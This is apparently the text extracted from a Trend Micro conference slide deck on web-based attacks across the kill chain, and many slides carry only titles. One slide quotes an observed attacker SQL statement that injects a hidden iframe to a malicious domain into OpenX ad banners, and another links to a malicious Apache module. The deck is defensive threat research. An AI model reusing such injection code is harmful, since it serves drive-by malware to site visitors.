Web As Ongoing Threat Vector: Case Studies from Europe and Asia Pacific
Fyodor Yarochkin, Vladimir Kropotov, TrendMicro FTR

Introduction
3

So how web is being used and abused?
The trivial: Drive-bys EKs .. but there is much more than this
4

Software gets smarter, users become .. the opposite ;)
With or without YOU...
5

Penetration and Data Exfil. Campaigns
These seem to leverage web for all steps of traditional killchain:
· recon :social lures, system fingerprinting, targeted delivery of first stage payloads · exploitation: exploits, social engineering tricks, phishing · c2: compromised sites, proxies, social network websites · data exfiltration: cloud services are often used for data exfil to mimic user behaviors
6

Out of scope
· We will not talk about trivial stuff here. · We will not talk about Denial of Service Attacks, Except for unusual trends. · We expect everybody in the room knows what Exploit Kits and Drive-by-Download attacks are · Focus less known, but important cases and situations
7

Censorship will save the future :)

Side effects of Internet Censorship

Infrastructure compromise could lead to bad impacts
Blacklisted domains resolve to "arbitrary" sites Github incident

GosKomNadzor (blacklisting)

dymoff.space

dymoff.space

How to Kill a site in country-wide scale

The Killchain
the common concept that Web is used during the exploitation process. The reality is that we've seen use of web systems across the whole killchain.
SMART
15

Killchain: Reconnaissance
16

Fingerprinting: scanbox like techniques
Discussed: http://pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-u sing-it-1.htmlhttp://pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected -and-whos-using-it-1.html Also by TombKeeper in 2013
17

Reconnessance tools
18

Non Violent environment fingerprinting actions
Flash case from Lurk:
19

Recon with multi-staged payloads
20

Killchain: delivery and exploitation
21

Web portals as a threat vector
· Initial vectors of compromise in targeted attacks (map pentest and APT scenarios) · Misconfigurations and their consequences (unpredicted data leaks) · Exfiltration as a customer communication (hypothetical, but maybe already in the wild) · BPC or Business logic compromises
22

Anti-forensic in early days
23

Delivery on non-standard ports
24

Watering Hole as a threat vector
credit: Joseph C Chen
25

Caching routines as a threat vector (Lurk Case 1)
· memcached Cache poisoning ·Observed: continuous flood of connection requests to TCP 11211 (default memcached port) ·Cached pages were updated with `iframed' versions of these pages on the fly
26

SSH Vuln as a threat vector (Lurk Case 2)
·Machine was compromised via an ssh vulnerability ·Apache web server had additional module installed: mod_proxy_mysql.so (didn't link any mysql libraries) ·This is possibly a modified version of http://pastebin.com/raw/6wWVsstj as reported by succuri (https://blog.sucuri.net/2013/01/server-side-ifra me-injections-via-apache-modules-and-sshd-bac kdoor.html)
27

OpenX as a threat vector (Lurk Case 3)
OpenX compromise · webshell installed · The Lurk group periodically modified banners table with
·update `banners` set htmltemplate=concat(htmltemplate,
'<script>document.write(\'<div style="position:absolute;left:1000px;top:-1280px;">
·<iframe
src="http://couldvestuck.org/XZAH"></iframe>< /div>\');
·</script>') where storagetype='html'
· This causes the OpenX script `/www/delivery/ajs.php' to produce the HTML code with this iframe snippet appearing at the page.
28

EK Evolution mostly focused on Usability and Antiforensics
· Serve where you can · Serve by IP once per day · Include GEO specifics · Serve during Intervals · Serve for appropriate browser · Server in appropriate environment · ....
29

ADD Period Abuse
30

Exploiting trusted redirects
31

Killchain: Command And Control
32

social networks are widely utilized as intermediate c2
33

Telegram as c2
34

Legit and non legit use
· C2 on compromised web sites (Korea case and many others) · Major objectives
­Adds extra layer of obfuscation ­Minimize untrusted connections issues
35

Steganography
Hunting for MZ (pe binaries) insiide .jpg files Saumil did awesome job exploring the boundaries: stegosploit
36

Persistence: awesomeness of simplicity
37

Killchain: Action
38

Ransomware attacks on server side web application
· All your data belongs to us
39

Cloud Exfiltration
40

Cloud Exfiltration
41

Client side web application as a threat vector
Maybe extend attack surface to open redirect,
·open redirect · SSRF ·Phishing forms · EK And make an introducion and focus on interesting EK cases
42

Tips on Detection
·Defence Action plan for CSIRT teams
43

Small things matter: investigate
44

Other interesting artifacts of Web Exploitation
45

Exploit Kit Traces: ActiveX Controls
·
46

Detection and mitigation experience
· Applying IOCs for own protection · How to tune proxies for EK Mitigation · Web as a second Echelon of Email attacks
­Good case, javascript by email, which triggers binary troug web
·
47

Hacker, hacker, who are you?
· VPN problem?
48

Strange use of F...
49

LEVEL 80: Persistence in the human brain - Abuse of social networks to manipulate Human Decisions
50

Questions? fyodor_yarochkin@trendmicro.com vladimir_kropotov@trendmicro.com
51

